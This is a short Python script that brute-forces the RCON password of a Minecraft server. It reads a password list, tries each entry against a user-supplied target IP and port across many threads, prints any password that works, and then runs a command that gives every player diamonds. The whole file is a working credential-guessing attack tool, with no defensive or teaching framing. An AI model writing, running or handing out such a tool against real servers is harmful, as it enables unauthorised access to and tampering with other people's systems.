from mcrcon import MCRcon
import threading
from queue import Queue

class RCONPasswordTrier:
    def __init__(self, host, port, passwords, command, max_threads):
        self.host = host
        self.port = port
        self.command = command
        self.max_threads = max_threads
        self.password_queue = Queue()
        self.lock = threading.Lock()
        self.total_attempts = 0  # Counter for total attempts

        for password in passwords:
            self.password_queue.put(password)

    @classmethod
    def from_file(cls, host, port, password_file, command, max_threads):
        with open(password_file, 'r') as file:
            passwords = [line.strip() for line in file]
        return cls(host, port, passwords, command, max_threads)

    def try_password(self):
        while not self.password_queue.empty():
            password = self.password_queue.get()
            with self.lock:
                self.total_attempts += 1  # Increment attempt count
                attempt_number = self.total_attempts

            try:
                with MCRcon(self.host, password, self.port) as mcr:
                    response = mcr.command(self.command)
                    with self.lock:
                        print(f"Password {attempt_number}: '{password}' is correct. Server Response: {response}")
                    return
            except Exception as e:
                with self.lock:
                    print(f"Password {attempt_number}: '{password}' failed: {str(e)[:50]}")

    def start(self):
        threads = []
        for _ in range(self.max_threads):
            thread = threading.Thread(target=self.try_password)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

if __name__ == "__main__":
    host = input("Enter target IP: ")
    port = int(input("Input RCON port (default is 25575): ") or 25575)
    command = "/give @a minecraft:diamond 64"
    max_threads = int(input("Input max threads: "))
    
    password_file = input("Input path to password list: ")
    trier = RCONPasswordTrier.from_file(host, port, password_file, command, max_threads)
    trier.start()
